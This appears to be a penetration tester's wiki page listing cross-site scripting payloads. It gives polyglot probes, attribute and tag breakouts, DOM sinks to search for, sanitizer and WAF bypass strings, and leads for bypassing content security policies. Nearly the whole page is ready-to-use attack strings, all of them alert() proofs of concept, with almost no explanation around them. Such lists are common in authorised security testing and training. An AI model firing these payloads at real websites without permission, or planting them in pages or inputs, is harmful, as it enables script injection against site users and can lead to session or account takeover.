---
title: "Payloads: XSS"
type: payloads
tags: [payloads, xss, web, client-side]
sources: []
date_created: 2026-06-05
date_updated: 2026-07-21
---

# Payloads: XSS

Reflected/stored/DOM probes + sanitizer/CSP bypasses. See [[techniques/web/xss]].

## Polyglots (context-agnostic first probes)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'"><img src=x onerror=alert(document.domain)>
"><svg onload=alert(1)>
```

## Attribute / tag breakouts
```
" autofocus onfocus=alert(1) x="
'-alert(1)-'
</textarea><script>alert(1)</script>
javascript:alert(1)      # href/src sinks
```

## DOM sinks to grep
```
innerHTML  outerHTML  document.write  eval  setTimeout(string)  location  srcdoc
.html()  $()  v-html  dangerouslySetInnerHTML
```

## Sanitizer / WAF bypass
```
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<img src=x onerror=alert`1`>
<details open ontoggle=alert(1)>
<x oNcliCk=alert(1)>click            # case
<script>alert(1)</script>       # unicode escape
data:text/html,<script>alert(1)</script>
```

## CSP bypass leads
```
JSONP endpoint on allowed origin · unsafe-inline · base-uri missing · object-src missing -> <object data>
'nonce' reuse · angular/vue gadget if framework on page
```

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[crlf]]
- [[crlf-injection]]
- [[css-injection]]
- [[csv-injection]]
- [[xs-leak]]
